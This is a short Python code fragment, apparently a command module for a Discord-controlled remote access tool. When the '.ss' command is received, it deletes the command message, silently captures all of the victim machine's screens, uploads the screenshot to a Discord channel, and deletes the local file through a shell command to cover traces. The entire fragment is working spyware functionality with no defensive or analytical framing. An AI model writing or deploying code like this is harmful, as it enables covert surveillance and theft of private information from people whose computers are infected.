from resources.misc import *
from PIL import ImageGrab
import subprocess
# end of imports

# on message
elif message.content == '.ss':
    await message.delete()
    ImageGrab.grab(all_screens=True).save('ss.png')
    reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time() + ' `[On demand]`', color=0x0084ff).set_image(url='attachment://ss.png'), file=discord.File('ss.png')); await reaction_msg.add_reaction('📌')
    subprocess.run('del ss.png', shell=True)
